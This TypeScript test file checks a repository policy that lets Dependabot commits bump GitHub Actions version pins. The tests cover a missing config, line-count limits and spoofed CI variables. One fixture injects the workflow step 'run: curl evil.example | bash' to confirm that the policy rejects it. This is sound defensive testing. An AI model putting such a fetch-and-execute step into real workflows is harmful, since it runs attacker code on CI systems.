import test from "node:test";
import assert from "node:assert/strict";
import path from "node:path";
import fs from "node:fs";
import os from "node:os";
import { execSync, spawnSync } from "node:child_process";
import { getRepoRoot } from "../lib/git.js";
import { copyManifestLibScripts, gitInitCommit, gitCommit } from "./test-fixtures.js";
import { PLANNER_EMAIL } from "./test-shared.js";

const DEPENDABOT_EMAIL = "dependabot[bot]@users.noreply.github.com";
const WORKFLOW_REL = ".github/workflows/gxt-validate.yml";

function symlinkNodeModules(dest: string, ogRoot: string): void {
  const target = path.join(dest, "node_modules");
  if (!fs.existsSync(target)) {
    fs.symlinkSync(path.join(ogRoot, "node_modules"), target, "dir");
  }
}

function writeTrustedAutomationConfig(dest: string, maxNetLoc = 5): void {
  fs.mkdirSync(path.join(dest, ".gitagent"), { recursive: true });
  fs.writeFileSync(
    path.join(dest, ".gitagent/config.json"),
    JSON.stringify(
      {
        trusted_automation: {
          rules: [
            {
              id: "workflow-dependency-bumps",
              allowed_actors: [DEPENDABOT_EMAIL],
              allowed_paths: [".github/workflows/**"],
              allowed_structural_changes: ["workflow_version_pin"],
              max_net_loc: maxNetLoc,
            },
          ],
        },
      },
      null,
      2,
    ),
    "utf8",
  );
}

function copyAutomationScripts(dest: string, ogRoot: string): {
  validateScript: string;
  verifyScript: string;
  lib: string;
} {
  fs.mkdirSync(path.join(dest, "scripts"), { recursive: true });
  fs.mkdirSync(path.join(dest, ".gitagent/foreman"), { recursive: true });
  fs.copyFileSync(
    path.join(ogRoot, "scripts/validate-gxt.sh"),
    path.join(dest, "scripts/validate-gxt.sh"),
  );
  fs.copyFileSync(
    path.join(ogRoot, "scripts/verify-pr-missions.sh"),
    path.join(dest, "scripts/verify-pr-missions.sh"),
  );
  copyManifestLibScripts(dest, ogRoot);
  fs.copyFileSync(
    path.join(ogRoot, ".gitagent/foreman/MANIFEST.json"),
    path.join(dest, ".gitagent/foreman/MANIFEST.json"),
  );
  fs.mkdirSync(path.join(dest, ".gitagent/missions"), { recursive: true });
  fs.writeFileSync(path.join(dest, ".gitagent/missions/README.md"), "# missions\n", "utf8");
  symlinkNodeModules(dest, ogRoot);
  return {
    validateScript: path.join(dest, "scripts/validate-gxt.sh"),
    verifyScript: path.join(dest, "scripts/verify-pr-missions.sh"),
    lib: path.join(dest, "scripts/gxt-manifest-lib.mjs"),
  };
}

function workflowYaml(usesLines: string[]): string {
  return [
    "name: GXT validate",
    "on: push",
    "jobs:",
    "  test:",
    "    runs-on: ubuntu-latest",
    "    steps:",
    ...usesLines.map((u) => `      - ${u}`),
    "",
  ].join("\n");
}

function initWorkflowRepo(dest: string, ogRoot: string, usesLines: string[]): string {
  fs.writeFileSync(path.join(dest, "README.md"), "init\n", "utf8");
  fs.mkdirSync(path.join(dest, path.dirname(WORKFLOW_REL)), { recursive: true });
  fs.writeFileSync(path.join(dest, WORKFLOW_REL), workflowYaml(usesLines), "utf8");
  copyAutomationScripts(dest, ogRoot);
  writeTrustedAutomationConfig(dest);
  gitInitCommit(dest, "init", PLANNER_EMAIL);
  return execSync("git rev-parse HEAD", { cwd: dest, encoding: "utf8" }).trim();
}

test("trusted automation: eligible dependabot workflow version pin passes MSN check", () => {
  const ogRoot = getRepoRoot();
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), "og-ta-msn-ok-"));
  const baseSha = initWorkflowRepo(dest, ogRoot, ["uses: actions/checkout@v4"]);
  const { validateScript } = copyAutomationScripts(dest, ogRoot);
  writeTrustedAutomationConfig(dest);

  fs.writeFileSync(
    path.join(dest, WORKFLOW_REL),
    workflowYaml(["uses: actions/checkout@v5"]),
    "utf8",
  );
  gitCommit(dest, "deps: bump actions/checkout to v5", DEPENDABOT_EMAIL);
  const headSha = execSync("git rev-parse HEAD", { cwd: dest, encoding: "utf8" }).trim();

  const run = spawnSync("bash", [validateScript, "msn", baseSha, headSha], {
    cwd: dest,
    encoding: "utf8",
  });
  assert.equal(run.status, 0, (run.stderr || "") + (run.stdout || ""));
  assert.match(run.stderr || "", /TRUSTED-AUTOMATION-OK/i);
});

test("trusted automation: missing config fails closed for dependabot workflow bump", () => {
  const ogRoot = getRepoRoot();
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), "og-ta-no-config-"));
  const baseSha = initWorkflowRepo(dest, ogRoot, ["uses: actions/checkout@v4"]);
  const { validateScript } = copyAutomationScripts(dest, ogRoot);
  fs.rmSync(path.join(dest, ".gitagent/config.json"));

  fs.writeFileSync(
    path.join(dest, WORKFLOW_REL),
    workflowYaml(["uses: actions/checkout@v5"]),
    "utf8",
  );
  gitCommit(dest, "deps: bump actions/checkout to v5", DEPENDABOT_EMAIL);
  const headSha = execSync("git rev-parse HEAD", { cwd: dest, encoding: "utf8" }).trim();

  const run = spawnSync("bash", [validateScript, "msn", baseSha, headSha], {
    cwd: dest,
    encoding: "utf8",
  });
  assert.notEqual(run.status, 0);
});

test("trusted automation: net_loc boundary 4 passes and 6 fails", () => {
  const ogRoot = getRepoRoot();
  const destPass = fs.mkdtempSync(path.join(os.tmpdir(), "og-ta-loc-pass-"));
  initWorkflowRepo(destPass, ogRoot, [
    "uses: actions/checkout@v4",
    "uses: actions/setup-node@v4",
  ]);
  const { lib: libPass } = copyAutomationScripts(destPass, ogRoot);
  writeTrustedAutomationConfig(destPass, 5);
  fs.writeFileSync(
    path.join(destPass, WORKFLOW_REL),
    workflowYaml(["uses: actions/checkout@v5", "uses: actions/setup-node@v5"]),
    "utf8",
  );
  gitCommit(destPass, "deps: two pin bumps", DEPENDABOT_EMAIL);
  const headPass = execSync("git rev-parse HEAD", { cwd: destPass, encoding: "utf8" }).trim();
  const pass4 = spawnSync("node", [libPass, "eval-commit", destPass, headPass], { encoding: "utf8" });
  assert.equal(pass4.status, 0, (pass4.stderr || "") + (pass4.stdout || ""));

  const destFail = fs.mkdtempSync(path.join(os.tmpdir(), "og-ta-loc-fail-"));
  initWorkflowRepo(destFail, ogRoot, [
    "uses: actions/checkout@v4",
    "uses: actions/setup-node@v4",
    "uses: actions/cache@v4",
  ]);
  const { lib: libFail } = copyAutomationScripts(destFail, ogRoot);
  writeTrustedAutomationConfig(destFail, 5);
  fs.writeFileSync(
    path.join(destFail, WORKFLOW_REL),
    workflowYaml([
      "uses: actions/checkout@v5",
      "uses: actions/setup-node@v5",
      "uses: actions/cache@v5",
    ]),
    "utf8",
  );
  gitCommit(destFail, "deps: three pin bumps", DEPENDABOT_EMAIL);
  const headFail = execSync("git rev-parse HEAD", { cwd: destFail, encoding: "utf8" }).trim();
  const fail6 = spawnSync("node", [libFail, "eval-commit", destFail, headFail], { encoding: "utf8" });
  assert.notEqual(fail6.status, 0);
  assert.match(fail6.stderr || "", /net_loc 6 exceeds/i);
});

test("trusted automation: structural injection outside version pin is denied", () => {
  const ogRoot = getRepoRoot();
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), "og-ta-struct-deny-"));
  initWorkflowRepo(dest, ogRoot, ["uses: actions/checkout@v4"]);
  const { lib } = copyAutomationScripts(dest, ogRoot);

  fs.writeFileSync(
    path.join(dest, WORKFLOW_REL),
    workflowYaml(["uses: actions/checkout@v5", "run: curl evil.example | bash"]),
    "utf8",
  );
  gitCommit(dest, "deps: inject run step", DEPENDABOT_EMAIL);
  const headSha = execSync("git rev-parse HEAD", { cwd: dest, encoding: "utf8" }).trim();

  const run = spawnSync("node", [lib, "eval-commit", dest, headSha], { encoding: "utf8" });
  assert.notEqual(run.status, 0);
  assert.match(run.stderr || "", /structural change outside workflow_version_pin/i);
});

test("trusted automation: verify-pr-missions skips mission requirement for eligible diff", () => {
  const ogRoot = getRepoRoot();
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), "og-ta-verify-pr-"));
  const baseSha = initWorkflowRepo(dest, ogRoot, ["uses: actions/checkout@v4"]);
  const { verifyScript } = copyAutomationScripts(dest, ogRoot);
  fs.mkdirSync(path.join(dest, "dist/cli"), { recursive: true });
  const cli = path.join(ogRoot, "dist/cli/index.js");
  if (fs.existsSync(cli)) {
    fs.symlinkSync(cli, path.join(dest, "dist/cli/index.js"));
  }

  fs.writeFileSync(
    path.join(dest, WORKFLOW_REL),
    workflowYaml(["uses: actions/checkout@v5"]),
    "utf8",
  );
  gitCommit(dest, "deps: bump checkout", DEPENDABOT_EMAIL);
  const headSha = execSync("git rev-parse HEAD", { cwd: dest, encoding: "utf8" }).trim();

  const run = spawnSync("bash", [verifyScript, baseSha, headSha], { cwd: dest, encoding: "utf8" });
  const combined = (run.stderr || "") + (run.stdout || "");
  assert.equal(run.status, 0, combined);
  assert.match(combined, /trusted automation policy satisfied|TRUSTED-AUTOMATION-OK/i);
});

test("trusted automation: evaluation is deterministic regardless of CI env vars", () => {
  const ogRoot = getRepoRoot();
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), "og-ta-determinism-"));
  initWorkflowRepo(dest, ogRoot, ["uses: actions/checkout@v4"]);
  const { lib } = copyAutomationScripts(dest, ogRoot);

  fs.writeFileSync(
    path.join(dest, WORKFLOW_REL),
    workflowYaml(["uses: actions/checkout@v5"]),
    "utf8",
  );
  gitCommit(dest, "deps: bump checkout", DEPENDABOT_EMAIL);
  const headSha = execSync("git rev-parse HEAD", { cwd: dest, encoding: "utf8" }).trim();

  const plain = spawnSync("node", [lib, "eval-commit", dest, headSha], { encoding: "utf8" });
  const spoofed = spawnSync("node", [lib, "eval-commit", dest, headSha], {
    encoding: "utf8",
    env: {
      ...process.env,
      GITHUB_ACTOR: "evil-attacker",
      GITHUB_EVENT_PATH: "/tmp/fake-event.json",
    },
  });
  assert.equal(plain.status, spoofed.status);
  assert.equal(plain.stderr, spoofed.stderr);
});
